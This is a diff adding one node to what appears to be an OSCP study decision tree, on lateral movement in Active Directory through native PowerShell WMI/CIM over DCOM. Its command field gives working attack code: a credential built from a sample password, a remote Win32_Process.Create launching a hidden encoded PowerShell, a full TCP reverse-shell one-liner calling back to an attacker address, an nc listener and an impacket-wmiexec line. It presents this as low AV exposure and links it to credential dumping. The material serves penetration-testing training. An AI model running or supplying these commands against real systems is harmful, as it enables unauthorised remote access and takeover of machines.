@@ -1,0 +1,38 @@
+{
+  "id": "wmi_cim_lateral",
+  "phase": "AD",
+  "title": "WMI / CIM Lateral Movement — Native PowerShell, No Impacket",
+  "body": "You're on a Windows foothold (say as jeff) and you have a credential for another user (say jen) who's local admin on a remote box. You want a shell there, but you're NOT on Kali — you can't reach for impacket-wmiexec. This is the living-off-the-land version: spawn a process on the remote host using only built-in PowerShell, over WMI via a CIM session.\n\nWHY THIS MATTERS ON OSCP:\n  - No tools to drop. Get-CimInstance / New-CimSession ship with Windows. AV is far less likely to flag native cmdlets than a dropped wmiexec binary.\n  - Works from a foothold when you can't easily tunnel SMB/WinRM back to Kali.\n  - DCOM transport (port 135 + dynamic RPC) is often open between domain hosts even when 5985/WinRM is filtered.\n\nHOW IT WORKS (the screenshot chain):\n  1. Build a PSCredential object for the user whose creds you have (jen)\n  2. Create a CIM session to the target over DCOM with those creds\n  3. Call Win32_Process.Create via Invoke-CimMethod to spawn a process — typically an encoded PowerShell reverse shell\n\nThe -EncodedCommand (-e) blob is a base64'd, UTF-16LE PowerShell payload (usually a reverse shell). Win32_Process.Create runs it on the REMOTE host in the context of the creds you supplied. You get a callback on your listener.\n\nKEY DETAIL — no output comes back:\nWin32_Process.Create is fire-and-forget. It returns a ProcessId and a ReturnValue (0 = success), NOT the command's output. That's why you pair it with a reverse shell, not a 'whoami'. If you want output-returning exec, use impacket-wmiexec from Kali instead — but that's not always reachable from a foothold.\n\nDCOM vs WinRM:\n  - This uses -Protocol DCOM (port 135). Use when WinRM is filtered.\n  - Drop -SessionOption to default to WSMan/WinRM (5985) instead.\n\nThis is the same enum-loop lesson: you got jen's cred from somewhere (spray, roast, mimikatz), and now you USE it to move. After landing the shell, re-enumerate as the new context.",
+  "cmd": "# ══════════════════════════════════════════════════\n# NATIVE CIM/DCOM LATERAL MOVEMENT (run FROM a Windows foothold)\n# ══════════════════════════════════════════════════\n# Context: you are jeff, you have jen's creds, jen is admin on 192.168.50.73.\n\n# 1) Build the credential object\n$username = 'jen'\n$password = 'Nexus123!'\n$secureString = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n\n# 2) CIM session over DCOM (port 135) — use when WinRM/5985 is filtered\n$Options = New-CimSessionOption -Protocol DCOM\n$Session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options\n\n# 3) Spawn a process on the remote host via Win32_Process.Create\n#    $Command is a base64 (UTF-16LE) encoded PowerShell reverse shell — see below\n$Command = 'powershell -nop -w hidden -e <BASE64_REVSHELL>'\nInvoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}\n\n# ReturnValue 0 = success. You get a ProcessId, NOT output. Catch the shell on your listener.\n\n# ══════════════════════════════════════════════════\n# BUILDING THE ENCODED REVERSE SHELL PAYLOAD\n# ══════════════════════════════════════════════════\n# On Kali — make the PS reverse shell one-liner, then base64-UTF16LE encode it.\n# Classic Nishang/one-liner TCP reverse shell, replace IP/PORT:\nLHOST=192.168.49.X; LPORT=443\nSHELL='$client = New-Object System.Net.Sockets.TCPClient(\"'$LHOST'\",'$LPORT');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\n# Encode it (PowerShell wants UTF-16LE then base64):\necho -n \"$SHELL\" | iconv -t UTF-16LE | base64 -w 0\n# Paste the result after  powershell -nop -w hidden -e\n\n# Start your listener BEFORE firing:\nnc -lvnp 443\n# or: rlwrap nc -lvnp 443   (better shell ergonomics)\n\n# ══════════════════════════════════════════════════\n# CLEANUP / NOTES\n# ══════════════════════════════════════════════════\n# Tear down the CIM session when done:\nRemove-CimSession -CimSession $Session\n\n# If WinRM IS available, drop -SessionOption to use WSMan (often more reliable):\n#   $Session = New-CimSession -ComputerName <ip> -Credential $credential\n\n# Output-returning alternative (from KALI, not a foothold):\n#   impacket-wmiexec corp.com/jen:'Nexus123!'@192.168.50.73\n# That gives a semi-interactive shell with output — but needs Kali reachability.\n\n# ══════════════════════════════════════════════════\n# TOOLKIT — invoke_cmd.ps1 (parameterized, hardened)\n# ══════════════════════════════════════════════════\n# The oscp-toolkit repo has this wrapped as a reusable script with\n# error handling, ReturnValue decoding, and guaranteed session cleanup.\n# Copy it to your Windows foothold and run:\n#   .\\invoke_cmd.ps1 -Target 192.168.50.73 -Username jen -Password 'Nexus123!' \\\n#       -Command 'powershell -nop -w hidden -e <BASE64_REVSHELL>'\n# Force WinRM instead of DCOM:  add  -Protocol Wsman\n# Source: github.com/Jimi421/oscp-toolkit  (tools/invoke_cmd.ps1)",
+  "warn": "Win32_Process.Create returns a ProcessId and ReturnValue, NOT command output — pair it with a reverse shell, not a one-shot command you expect to read. Make sure your listener is running before you invoke the method, or the callback is lost.",
+  "choices": [
+    {
+      "label": "Got a shell — enumerate as the new context",
+      "next": "bloodhound_authenticated"
+    },
+    {
+      "label": "Need other lateral movement methods (impacket, WinRM)",
+      "next": "lateral_movement"
+    },
+    {
+      "label": "Have a hash not a password — pass-the-hash",
+      "next": "pth"
+    },
+    {
+      "label": "Need a reverse shell payload / listener setup",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "On the target — dump creds with mimikatz",
+      "next": "mimikatz"
+    },
+    {
+      "label": "Back to AD menu",
+      "next": "jump_ad"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
